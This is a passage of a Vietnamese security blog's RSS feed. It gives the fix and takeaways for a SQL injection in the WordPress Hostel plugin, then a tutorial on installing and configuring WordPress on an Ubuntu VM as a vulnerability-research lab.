class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Cập nhật lên &lt;strong&gt;Hostel Plugin v1.1.5.7&lt;/strong&gt; hoặc mới hơn&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;takeaways&#34;&gt;&lt;span&gt;Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt; ≠ chống &lt;strong&gt;SQL Injection&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Cần phân biệt rõ: lọc input cho HTML vs cho SQL&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection Cheat Sheet – PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/hostel/vulnerability/wordpress-hostel-1-1-5-6-sql-injection-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hostel Plugin &amp;lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>WordPress Local and Debugging</title>
      <link>http://localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/</link>
      <pubDate>Thu, 21 Aug 2025 09:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/</guid>
      <category domain="http://localhost:1313/vi/categories/web/">Web</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-08-21-wordpress-local-and-debugging/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;&lt;strong&gt;WordPress&lt;/strong&gt; là một hệ thống quản lý nội dung (CMS) mạnh mẽ và phổ biến nhất cho phép bạn tạo, quản lý và tùy chỉnh các trang web và blog một cách dễ dàng. Nó là open-source CMS, được xây dựng trên PHP và sử dụng cơ sở dữ liệu MySQL hoặc Maria DB.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ra đời năm 2003, ban đầu chỉ để viết blog, sau đó phát triển thành nền tảng tạo website, cửa hàng online, diễn đàn, landing page…&lt;/li&gt;&#xA;&lt;li&gt;Hiện nay, hơn 40% website trên thế giới chạy bằng WordPress.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Có 2 phiên bản WordPress:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;WordPress.com&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Dịch vụ hosting do Automattic cung cấp&lt;/li&gt;&#xA;&lt;li&gt;Bạn chỉ cần đăng ký tài khoản, không phải cài đặt&lt;/li&gt;&#xA;&lt;li&gt;Hạn chế tùy chỉnh, muốn nâng cao thì phải trả phí&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;WordPress.org&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Mã nguồn mở, bạn tự tải về và cài đặt lên hosting/server riêng&lt;/li&gt;&#xA;&lt;li&gt;Tùy chỉnh toàn diện, có thể cài plugin, theme, viết code, tạo website theo ý mình&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;ecosystem&#34;&gt;&lt;span&gt;Ecosystem&lt;/span&gt;&#xA;  &lt;a href=&#34;#ecosystem&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Core: CMS chính&lt;/li&gt;&#xA;&lt;li&gt;Plugin: Một phần mềm bổ sung có thể được cài đặt trên trang web WordPress để mở rộng chức năng của nó và thêm các tính năng mới&lt;/li&gt;&#xA;&lt;li&gt;Themes: Một phần mềm bổ sung đại diện cho sự xuất hiện trực quan và bố cục của một trang web WordPress&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;why-wordpress-hacking&#34;&gt;&lt;span&gt;Why WordPress Hacking?&lt;/span&gt;&#xA;  &lt;a href=&#34;#why-wordpress-hacking&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/whitepaper/state-of-wordpress-security-in-2024&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;State of WordPress Security in 2024&lt;/a&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;most-popular&#34;&gt;&lt;span&gt;Most Popular&lt;/span&gt;&#xA;  &lt;a href=&#34;#most-popular&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Hiện tại hơn 40% website trên toàn thế giới chạy WordPress&lt;/li&gt;&#xA;&lt;li&gt;Nghĩa là hacker chỉ cần tìm ra một lỗ hổng phổ biến =&amp;gt; có thể khai thác hàng triệu site cùng lúc&lt;/li&gt;&#xA;&lt;li&gt;Giống như &lt;code&gt;“cá nhiều thì chài ở đó”&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;plugin-and-theme&#34;&gt;&lt;span&gt;Plugin and Theme&lt;/span&gt;&#xA;  &lt;a href=&#34;#plugin-and-theme&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;WordPress Core đã được xem xét trong 1 thời gian dài bởi hàng ngàn &lt;strong&gt;developers&lt;/strong&gt; và &lt;strong&gt;researchers&lt;/strong&gt;. Kết quả là rất khó để kẻ tấn công có thể đột nhập vào&lt;/li&gt;&#xA;&lt;li&gt;Tuy nhiên, có hàng chục ngàn plugin và theme từ nhiều nguồn, chất lượng không đồng đều được sử dụng&lt;/li&gt;&#xA;&lt;li&gt;Nhiều plugin code bảo mật kém, không còn được cập nhật. Hacker chỉ cần scan plugin/theme để tìm version lỗi thời, rồi khai thác&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;setup-wordpress-for-hacking&#34;&gt;&lt;span&gt;Setup WordPress for Hacking&lt;/span&gt;&#xA;  &lt;a href=&#34;#setup-wordpress-for-hacking&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Có rất nhiều cách để setup WorkPress, tìm kiếm bằng &lt;strong&gt;Google&lt;/strong&gt; có thể cung cấp nhiều bài viết về nó. Ở đây tôi sẽ setup trên máy ảo &lt;strong&gt;Ubuntu (22.04)&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Không ảnh hưởng đến các dịch vụ của máy thật&lt;/li&gt;&#xA;&lt;li&gt;WordPress tương đối nhẹ để sử dụng trên máy ảo&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;install-and-configure-wordpress&#34;&gt;&lt;span&gt;Install and configure WordPress&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-and-configure-wordpress&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;install-dependencies&#34;&gt;&lt;span&gt;Install Dependencies&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-dependencies&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Cài toàn bộ stack cần thiết để chạy WordPress (web server + database + PHP + các extension quan trọng).&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install apache2 \&#xA;                 ghostscript \&#xA;                 libapache2-mod-php \&#xA;                 mysql-server \&#xA;                 php \&#xA;                 php-bcmath \&#xA;                 php-curl \&#xA;                 php-imagick \&#xA;                 php-intl \&#xA;                 php-json \&#xA;                 php-mbstring \&#xA;                 php-mysql \&#xA;                 php-xml \&#xA;                 php-zip&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;install-wordpress&#34;&gt;&lt;span&gt;Install WordPress&lt;/span&gt;&#xA;  &lt;a href=&#34;#install-wordpress&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Tải và cài mã nguồn WordPress vào thư mục web.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# Tạo folder để lưu trữ mã nguồn website&#xA;sudo mkdir -p /srv/www&#xA;&#xA;# Đổi owner thành www-data, đây là user mặc định của Apache/Nginx để chạy web server&#xA;# Khi Apache/NGINX khởi động, nó không chạy bằng root (nguy hiểm vì có toàn quyền hệ thống), mà sẽ drop xuống chạy dưới quyền www-data.&#xA;sudo chown www-data: /srv/www&#xA;&#xA;# Tải gói WordPress mới nhất từ trang chính thức&#xA;# Giải nén vao thưc mục /srv/www được tạo ở trên&#xA;curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Có thể tải phiên bản cụ thể bằng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;Cài từ &lt;code&gt;wordpress.org&lt;/code&gt; là cách chuẩn nhất và ít rủi ro:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ubuntu có sẵn package &lt;strong&gt;wordpress&lt;/strong&gt; trong repo. Nhưng nó thường cũ hơn nhiều so với bản chính thức trên &lt;code&gt;wordpress.org&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Cộng đồng WordPress chỉ hỗ trợ khi bạn dùng bản chính thức từ &lt;code&gt;wordpress.org&lt;/code&gt;, vì nếu bạn gặp lỗi do package của Ubuntu thì họ không giải quyết được.&#xA;{: .prompt-info }&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-apache-for-wordpress&#34;&gt;&lt;span&gt;Configure Apache for WordPress&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-apache-for-wordpress&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Tạo file &lt;code&gt;/etc/apache2/sites-available/wordpress.conf&lt;/code&gt; cấu hình Apache cho WordPress:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# Lắng nghe trên tất cả địa chỉ IP (*) tại port 80 (HTTP).&#xA;&amp;lt;VirtualHost *:80&amp;gt;  &#xA;&#xA;    # Thư mục gốc của website (nơi chứa mã nguồn WordPress).&#xA;    DocumentRoot /srv/www/wordpress &#xA;    &amp;lt;Directory /srv/www/wordpress&amp;gt;&#xA;        Options FollowSymLinks&#xA;&#xA;        # Cho phép file .htaccess ghi đè một số thiết lập liên quan đến bảo mật và URL rewriting.&#xA;        AllowOverride Limit Options FileInfo &#xA;&#xA;        # Khi truy cập thư mục, Apache sẽ tìm file index.php để hiển thị.&#xA;        DirectoryIndex index.php &#xA;&#xA;        # Cho phép tất cả mọi người truy cập (cần cho website public).&#xA;        Require all granted &#xA;    &amp;lt;/Directory&amp;gt;&#xA;&#xA;    # Riêng thư mục wp-content (chứa plugin, theme, upload) cũng cho phép truy cập.&#xA;    &amp;lt;Directory /srv/www/wordpress/wp-content&amp;gt; &#xA;        Options FollowSymLinks&#xA;        Require all granted&#xA;    &amp;lt;/Directory&amp;gt;&#xA;&amp;lt;/VirtualHost&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Kích hoạt site WordPress&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo a2ensite wordpress&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;a2ensite&lt;/strong&gt; = &lt;code&gt;enable site config&lt;/code&gt; (tạo symlink từ &lt;code&gt;/etc/apache2/sites-available/wordpress.conf&lt;/code&gt; sang &lt;code&gt;/etc/apache2/sites-enabled/&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;Sau đó site wordpress sẽ được Apache load khi restart.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kích hoạt module rewrite&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo a2enmod rewrite&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;WordPress cần module mod_rewrite để hỗ trợ &lt;strong&gt;Pretty Permalinks&lt;/strong&gt; (ví dụ &lt;code&gt;/blog/hello-world/&lt;/code&gt; thay vì &lt;code&gt;?p=123&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Vô hiệu hóa site mặc định (Option)&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo a2dissite 000-default&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Apache mặc định có site &lt;code&gt;000-default.conf&lt;/code&gt; (chỉ hiển thị &amp;ldquo;It works!&amp;rdquo;)&lt;/li&gt;&#xA;&lt;li&gt;Nếu không disable, site mặc định có thể chiếm port &lt;code&gt;80&lt;/code&gt; trước WordPress&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 Hoặc nếu không muốn disable, có thể thêm ServerName vào VirtualHost WordPress để Apache phân biệt domain.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;VirtualHost *:80&amp;gt;&#xA;    ServerName mywordpress.local&#xA;    DocumentRoot /srv/www/wordpress&#xA;    ...&#xA;&amp;lt;/VirtualHost&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Muốn chạy được thì phải cấu hình DNS hoặc sửa file hosts:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Linux/Mac: &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Windows: &lt;code&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Reload Apache&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo service apache2 reload&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Tải lại cấu hình mới mà không cần dừng server&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;configure-database&#34;&gt;&lt;span&gt;Configure database&lt;/span&gt;&#xA;  &lt;a href=&#34;#configure-database&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 